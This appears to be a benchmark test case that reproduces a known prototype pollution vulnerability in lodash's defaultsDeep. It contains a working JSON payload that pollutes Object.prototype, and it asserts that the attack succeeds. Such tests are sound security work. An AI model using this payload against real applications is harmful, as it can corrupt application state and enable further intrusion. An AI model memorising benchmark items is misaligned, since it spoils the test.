//https://security.snyk.io/vuln/SNYK-JS-LODASH-450202
test("prototype pollution in lodash", () => {
  const mergeFn = require("lodash").defaultsDeep;
  const payload = process.env.SECBENCH_PAYLOAD || ('{"constructor": {"prototype": {"polluted": "yes"}}}');
  expect({}.polluted).toBe(undefined);

  mergeFn({}, JSON.parse(payload));

  expect({}.polluted).toBe("yes");
});
